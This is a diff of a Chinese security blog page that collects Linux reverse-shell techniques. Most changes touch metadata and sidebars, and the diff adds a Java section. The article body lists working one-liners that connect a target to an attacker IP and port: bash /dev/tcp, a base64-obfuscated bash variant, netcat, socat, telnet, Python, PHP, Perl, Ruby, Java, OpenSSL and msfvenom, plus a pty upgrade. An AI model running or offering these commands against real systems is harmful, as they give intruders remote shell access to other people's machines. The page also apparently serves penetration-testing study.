@@ -42,10 +42,10 @@
         content="article">
       <meta 
         property="og:article:published_time" 
-        content="2021-06-20">
+        content="2021-06-15">
       <meta 
         property="og:article:modified_time" 
-        content="2021-07-21">
+        content="2021-08-09">
       <meta 
         property="og:article:author" 
         content="沉墨">
@@ -270,12 +270,12 @@
     </h1>
   </header>
   <div class="post-meta post-show-meta">
-    <time datetime="2021-06-20T06:36:45.000Z">
+    <time datetime="2021-06-15T12:17:13.000Z">
       <i 
         class="iconfont icon-calendar" 
         style="margin-right: 2px;">
       </i>
-      <span>2021-06-20</span>
+      <span>2021-06-15</span>
     </time>
     
       <span class="dot"></span>
@@ -289,7 +289,7 @@
     
     
       <span class="dot"></span>
-      <span>1.6k 字</span>
+      <span>1.7k 字</span>
     
   </div>
   
@@ -324,25 +324,25 @@
 <table>
 <thead>
 <tr>
-<th>命令</th>
-<th>命令详解</th>
+<th align="left">命令</th>
+<th align="left">命令详解</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>bash -i</td>
-<td>产生一个bash交互环境。</td>
+<td align="left">bash -i</td>
+<td align="left">产生一个bash交互环境。</td>
 </tr>
 <tr>
-<td>&gt;&amp;</td>
-<td>将联合符号前面的内容与后面相结合，然后一起重定向给后者。</td>
+<td align="left">&gt;&amp;</td>
+<td align="left">将联合符号前面的内容与后面相结合，然后一起重定向给后者。</td>
 </tr>
 <tr>
-<td>/dev/tcp/47.xxx.xxx.72/2333</td>
-<td>Linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。</td>
+<td align="left">/dev/tcp/47.xxx.xxx.72/2333</td>
+<td align="left">Linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。</td>
 </tr>
 <tr>
-<td>0&gt;&amp;1</td>
-<td>将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。</td>
+<td align="left">0&gt;&amp;1</td>
+<td align="left">将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。</td>
 </tr>
 </tbody></table>
 <p>Bash反弹一句完整的解读过程就是：</p>
@@ -353,10 +353,8 @@
 <p>2、目标机反弹连接攻击机</p>
 <pre class="highlight"><span class="line">bash -c &quot;bash -i &gt;&amp;  /dev/tcp/192.168.66.138/1111 0&gt;&amp;1&quot;</span><br></pre>
 
-
-
 <h5 id="注意：利用工具写入反弹shell时，命令如下："><a href="#注意：利用工具写入反弹shell时，命令如下：" class="headerlink" title="注意：利用工具写入反弹shell时，命令如下："></a>注意：利用工具写入反弹shell时，命令如下：</h5><p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=}|{base64,-d}|{bash,-i}</p>
-<p>其中，加密部分为bash -i &gt;&amp;  /dev/tcp/192.168.66.138/1111 0&gt;&amp;1的base64编码。IP、端口修改时需重新进行base64加密</p>
+<p>其中，加密部分为bash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1的base64编码。IP、端口修改时需重新进行base64加密</p>
 <h2 id="netcat反弹shell"><a href="#netcat反弹shell" class="headerlink" title="netcat反弹shell"></a>netcat反弹shell</h2><p>1、linux默认自带netcat工具，但是反弹shell功能-e参数通常被阉割，需要手动下载二进制安装包。</p>
 <pre class="highlight"><span class="line">wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz</span><br><span class="line">tar -xvzf netcat-0.7.1.tar.gz</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">make clean</span><br></pre>
 
@@ -365,10 +363,6 @@
 
 <p>3、目标机主动连接攻击机</p>
 <pre class="highlight"><span class="line">netcat 192.168.66.138 1111 -e /bin/bash</span><br><span class="line"># netcat &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash</span><br></pre>
-
-
-
-
 
 <h2 id="Curl-Bash反弹shell"><a href="#Curl-Bash反弹shell" class="headerlink" title="Curl+Bash反弹shell"></a>Curl+Bash反弹shell</h2><p>借助Linux管道命令。</p>
 <p>1、在攻击者vps（公网）的web目录里面创建一个index文件（index.php或index.html），内容如下：</p>
@@ -390,10 +384,6 @@
 <p>3、目标机主动连接攻击机</p>
 <pre class="highlight"><span class="line">socat tcp-connect:192.168.66.138:1111 exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane</span><br></pre>
 
-
-
-
-
 <h2 id="Telnet反弹shell"><a href="#Telnet反弹shell" class="headerlink" title="Telnet反弹shell"></a>Telnet反弹shell</h2><p>当nc和/dev/tcp不可用时，且目标机和攻击机都开启telnet（23端口）服务时，可用telnet反弹shell。</p>
 <p>方法一：</p>
 <p>1、攻击机开启本地监听：</p>
@@ -401,8 +391,6 @@
 
 <p>2、目标机主动连接攻击机</p>
 <pre class="highlight"><span class="line">mknod a p;telnet 192.168.66.138 1111 0&lt;a | /bin/bash 1&gt;a</span><br></pre>
-
-
 
 <p>方法二：</p>
 <p>1、攻击机开启两个本地监听：</p>
@@ -415,31 +403,19 @@
 <pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>
 
 <p>2、目标机主动连接攻击机</p>
-<pre class="highlight"><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.66.138&quot;,1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre>
-
-
-
-
+<pre class="highlight"><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.66.138&quot;,1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre>
 
 <h2 id="PHP脚本反弹shell"><a href="#PHP脚本反弹shell" class="headerlink" title="PHP脚本反弹shell"></a>PHP脚本反弹shell</h2><p>1、攻击机开启本地监听</p>
 <pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>
 
 <p>2、目标机主动连接攻击机：</p>
-<pre class="highlight"><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;192.168.66.138&quot;,1111);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre>
-
-
-
-
+<pre class="highlight"><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.66.138&quot;,1111);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre>
 
 <h2 id="Perl脚本反弹shell（后缀-pl）"><a href="#Perl脚本反弹shell（后缀-pl）" class="headerlink" title="Perl脚本反弹shell（后缀.pl）"></a>Perl脚本反弹shell（后缀.pl）</h2><p>1、攻击机开启本地监听</p>
 <pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>
 
 <p>2、目标机主动连接攻击机</p>
-<pre class="highlight"><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.66.138&quot;;$p=1111;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre>
-
-
-
-
+<pre class="highlight"><span class="line">perl -e &#x27;use Socket;$i=&quot;192.168.66.138&quot;;$p=1111;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre>
 
 <h2 id="Ruby脚本反弹shell（后缀-rb）"><a href="#Ruby脚本反弹shell（后缀-rb）" class="headerlink" title="Ruby脚本反弹shell（后缀.rb）"></a>Ruby脚本反弹shell（后缀.rb）</h2><p>1、攻击机开启本地监听</p>
 <pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>
@@ -447,9 +423,11 @@
 <p>2、目标机主动连接攻击机</p>
 <pre class="highlight"><span class="line">ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;192.168.66.138&quot;,&quot;1111&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br><span class="line">或</span><br><span class="line">ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;192.168.66.138&quot;,&quot;1111&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre>
 
+<h2 id="JAVA反弹shell"><a href="#JAVA反弹shell" class="headerlink" title="JAVA反弹shell"></a>JAVA反弹shell</h2><p>1、攻击机开启本地监听</p>
+<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>
 
-
-
+<p>2、目标机主动连接攻击机</p>
+<pre class="highlight"><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.x.x/1111;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre>
 
 <h2 id="Metasploit生成反弹shell"><a href="#Metasploit生成反弹shell" class="headerlink" title="Metasploit生成反弹shell"></a>Metasploit生成反弹shell</h2><p>1、自动生成反弹一句话</p>
 <pre class="highlight"><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=192.168.66.138 LPORT=1111 -f raw</span><br></pre>
@@ -465,10 +443,6 @@
 <p>3、在目标机上进行反弹shell</p>
 <pre class="highlight"><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.66.138:1111 &gt; /tmp/s; rm /tmp/s</span><br></pre>
 
-
-
-
-
 <h2 id="反弹shell后获取模拟终端"><a href="#反弹shell后获取模拟终端" class="headerlink" title="反弹shell后获取模拟终端"></a>反弹shell后获取模拟终端</h2><p>上面所讲的各种方法获取的shell都不是一个标准的虚拟终端环境，它仅仅是一个标准输入。你会发现存在一个问题，就是即使我们获取了目标虚拟终端控制权限，但是往往会发现其交互性非常的差，回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。</p>
 <p>1、获取的虚拟终端没有交互性，我们想给添加的账号设置密码或执行sudo等命令，无法完成。</p>
 <p>2、标准的错误输出无法显示，无法正常使用vim等文本编辑器等。</p>
@@ -476,9 +450,30 @@
 <p>若是无法完成正常交互，则需要使用python模拟终端设备，命令如下：</p>
 <pre class="highlight"><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre>
 
-
   </div>
   <div>
+    
+      <div 
+        class="post-note note-warning copyright" 
+        style="margin-top: 42px">
+        <p>
+          <span style="font-weight: bold;">作者：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="/about">
+            沉墨
+          </a>
+        </p>
+        <p>
+          <span style="font-weight: bold;">文章链接：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="https://www.zerochen.top/article/%E5%8F%8D%E5%BC%B9shell%E5%BD%92%E7%BA%B3/">
+            https://www.zerochen.top/article/%E5%8F%8D%E5%BC%B9shell%E5%BD%92%E7%BA%B3/
+          </a>
+        </p>
+        <p><span style="font-weight: bold;">版权声明：</span>转载请注明出处！</p>
+      </div>
     
   </div>
 </article>
@@ -486,13 +481,13 @@
   
     <div class="nav-item-prev">
       <a 
-        href="/article/Windows%E5%A4%9A%E4%B8%AAJava%E7%8E%AF%E5%A2%83%E5%85%B1%E5%AD%98/" 
+        href="/article/Java%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/" 
         class="nav-link">
         <i class="iconfont icon-left nav-prev-icon"></i>
         <div>
           <div class="nav-label">上一篇</div>
           
-            <div class="nav-title">Windows多个Java环境共存 </div>
+            <div class="nav-title">Java环境变量配置 </div>
           
         </div>
       </a>
@@ -501,12 +496,12 @@
   
     <div class="nav-item-next">
       <a 
-        href="/article/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%E5%B9%B6%E6%8F%90%E6%9D%83/" 
+        href="/article/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7-%E6%8F%90%E6%9D%83/" 
         class="nav-link">
         <div>
           <div class="nav-label">下一篇</div>
           
-            <div class="nav-title">添加用户并提权 </div>
+            <div class="nav-title">创建用户+提权 </div>
           
         </div>
         <i class="iconfont icon-right nav-next-icon"></i>
@@ -560,7 +555,7 @@
     style="padding-right: 2px;">
   </i>目录
 </div>
-<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E5%8F%8D%E5%BC%B9shell%E5%BD%92%E7%BA%B3"><span class="toc-text">Linux反弹shell归纳</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Bash反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%EF%BC%9A%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7%E5%86%99%E5%85%A5%E5%8F%8D%E5%BC%B9shell%E6%97%B6%EF%BC%8C%E5%91%BD%E4%BB%A4%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-text">注意：利用工具写入反弹shell时，命令如下：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#netcat%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">netcat反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Curl-Bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Curl+Bash反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Socat%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Socat反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Telnet%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Telnet反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Python脚本反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">PHP脚本反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Perl%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E5%90%8E%E7%BC%80-pl%EF%BC%89"><span class="toc-text">Perl脚本反弹shell（后缀.pl）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ruby%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E5%90%8E%E7%BC%80-rb%EF%BC%89"><span class="toc-text">Ruby脚本反弹shell（后缀.rb）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Metasploit生成反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OpenSSL%E5%8F%8D%E5%BC%B9%E5%8A%A0%E5%AF%86shell"><span class="toc-text">OpenSSL反弹加密shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E5%90%8E%E8%8E%B7%E5%8F%96%E6%A8%A1%E6%8B%9F%E7%BB%88%E7%AB%AF"><span class="toc-text">反弹shell后获取模拟终端</span></a></li></ol></li></ol>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E5%8F%8D%E5%BC%B9shell%E5%BD%92%E7%BA%B3"><span class="toc-text">Linux反弹shell归纳</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Bash反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%EF%BC%9A%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7%E5%86%99%E5%85%A5%E5%8F%8D%E5%BC%B9shell%E6%97%B6%EF%BC%8C%E5%91%BD%E4%BB%A4%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-text">注意：利用工具写入反弹shell时，命令如下：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#netcat%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">netcat反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Curl-Bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Curl+Bash反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Socat%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Socat反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Telnet%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Telnet反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Python脚本反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">PHP脚本反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Perl%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E5%90%8E%E7%BC%80-pl%EF%BC%89"><span class="toc-text">Perl脚本反弹shell（后缀.pl）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ruby%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E5%90%8E%E7%BC%80-rb%EF%BC%89"><span class="toc-text">Ruby脚本反弹shell（后缀.rb）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JAVA%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">JAVA反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Metasploit生成反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OpenSSL%E5%8F%8D%E5%BC%B9%E5%8A%A0%E5%AF%86shell"><span class="toc-text">OpenSSL反弹加密shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E5%90%8E%E8%8E%B7%E5%8F%96%E6%A8%A1%E6%8B%9F%E7%BB%88%E7%AB%AF"><span class="toc-text">反弹shell后获取模拟终端</span></a></li></ol></li></ol>
 </div></main>
             <aside class="left-column">
               
@@ -572,24 +567,24 @@
     alt="author avatar">
 
 <p class="author-name">沉墨</p>
-<p class="author-description">努力成为一个Python脚本小子</p>
+<p class="author-description">谨言多思，野蛮生长</p>
 <div class="author-message">
   <a 
     class="author-posts-count" 
     href="/archives">
-    <span>26</span>
+    <span>43</span>
     <span>文章</span>
   </a>
   <a 
     class="author-categories-count" 
     href="/categories">
-    <span>8</span>
+    <span>9</span>
     <span>分类</span>
   </a>
   <a 
     class="author-tags-count" 
     href="/tags">
-    <span>26</span>
+    <span>43</span>
     <span>标签</span>
   </a>
 </div>
@@ -606,7 +601,7 @@
     style="padding-right: 2px;">
   </i>目录
 </div>
-<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E5%8F%8D%E5%BC%B9shell%E5%BD%92%E7%BA%B3"><span class="toc-text">Linux反弹shell归纳</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Bash反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%EF%BC%9A%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7%E5%86%99%E5%85%A5%E5%8F%8D%E5%BC%B9shell%E6%97%B6%EF%BC%8C%E5%91%BD%E4%BB%A4%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-text">注意：利用工具写入反弹shell时，命令如下：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#netcat%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">netcat反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Curl-Bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Curl+Bash反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Socat%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Socat反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Telnet%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Telnet反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Python脚本反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">PHP脚本反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Perl%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E5%90%8E%E7%BC%80-pl%EF%BC%89"><span class="toc-text">Perl脚本反弹shell（后缀.pl）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ruby%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E5%90%8E%E7%BC%80-rb%EF%BC%89"><span class="toc-text">Ruby脚本反弹shell（后缀.rb）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Metasploit生成反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OpenSSL%E5%8F%8D%E5%BC%B9%E5%8A%A0%E5%AF%86shell"><span class="toc-text">OpenSSL反弹加密shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E5%90%8E%E8%8E%B7%E5%8F%96%E6%A8%A1%E6%8B%9F%E7%BB%88%E7%AB%AF"><span class="toc-text">反弹shell后获取模拟终端</span></a></li></ol></li></ol>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E5%8F%8D%E5%BC%B9shell%E5%BD%92%E7%BA%B3"><span class="toc-text">Linux反弹shell归纳</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Bash反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%EF%BC%9A%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7%E5%86%99%E5%85%A5%E5%8F%8D%E5%BC%B9shell%E6%97%B6%EF%BC%8C%E5%91%BD%E4%BB%A4%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-text">注意：利用工具写入反弹shell时，命令如下：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#netcat%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">netcat反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Curl-Bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Curl+Bash反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Socat%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Socat反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Telnet%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Telnet反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Python脚本反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">PHP脚本反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Perl%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E5%90%8E%E7%BC%80-pl%EF%BC%89"><span class="toc-text">Perl脚本反弹shell（后缀.pl）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ruby%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E5%90%8E%E7%BC%80-rb%EF%BC%89"><span class="toc-text">Ruby脚本反弹shell（后缀.rb）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JAVA%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">JAVA反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">Metasploit生成反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OpenSSL%E5%8F%8D%E5%BC%B9%E5%8A%A0%E5%AF%86shell"><span class="toc-text">OpenSSL反弹加密shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E5%90%8E%E8%8E%B7%E5%8F%96%E6%A8%A1%E6%8B%9F%E7%BB%88%E7%AB%AF"><span class="toc-text">反弹shell后获取模拟终端</span></a></li></ol></li></ol>
       </div>
     </article>
   
@@ -621,24 +616,31 @@
   </div>
   <div class="categories-list">
     
-      <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+      <a href="/categories/Web%E6%B8%97%E9%80%8F/">
         <div class="categories-list-item">
-          漏洞复现
-          <span class="categories-list-item-badge">4</span>
-        </div>
-      </a>
-    
-      <a href="/categories/%E9%99%84%E5%8A%A0/">
-        <div class="categories-list-item">
-          附加
-          <span class="categories-list-item-badge">2</span>
+          Web渗透
+          <span class="categories-list-item-badge">20</span>
         </div>
       </a>
     
       <a href="/categories/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/">
         <div class="categories-list-item">
           编程基础
-          <span class="categories-list-item-badge">1</span>
+          <span class="categories-list-item-badge">3</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/">
+        <div class="categories-list-item">
+          网络基础
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+        <div class="categories-list-item">
+          漏洞复现
+          <span class="categories-list-item-badge">5</span>
         </div>
       </a>
     
@@ -649,17 +651,10 @@
         </div>
       </a>
     
-      <a href="/categories/Web%E6%B8%97%E9%80%8F/">
-        <div class="categories-list-item">
-          Web渗透
-          <span class="categories-list-item-badge">5</span>
-        </div>
-      </a>
-    
       <a href="/categories/Linux/">
         <div class="categories-list-item">
           Linux
-          <span class="categories-list-item-badge">2</span>
+          <span class="categories-list-item-badge">1</span>
         </div>
       </a>
     
@@ -673,6 +668,13 @@
       <a href="/categories/Windows/">
         <div class="categories-list-item">
           Windows
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E9%99%84%E5%8A%A0%E6%8A%80%E8%83%BD/">
+        <div class="categories-list-item">
+          附加技能
           <span class="categories-list-item-badge">1</span>
         </div>
       </a>
@@ -698,27 +700,63 @@
       </a>
     
       <a 
-        href="/tags/hexo%E5%8D%9A%E5%AE%A2/" 
-        title="hexo博客">
-        <div class="tags-list-item">hexo博客</div>
+        href="/tags/Redis/" 
+        title="Redis">
+        <div class="tags-list-item">Redis</div>
       </a>
     
       <a 
-        href="/tags/%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0/" 
-        title="直播推流平台">
-        <div class="tags-list-item">直播推流平台</div>
+        href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" 
+        title="逻辑漏洞">
+        <div class="tags-list-item">逻辑漏洞</div>
       </a>
     
       <a 
-        href="/tags/Nginx%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" 
-        title="Nginx环境搭建">
-        <div class="tags-list-item">Nginx环境搭建</div>
+        href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" 
+        title="网络协议">
+        <div class="tags-list-item">网络协议</div>
       </a>
     
       <a 
-        href="/tags/LAMP/" 
-        title="LAMP">
-        <div class="tags-list-item">LAMP</div>
+        href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" 
+        title="文件包含">
+        <div class="tags-list-item">文件包含</div>
+      </a>
+    
+      <a 
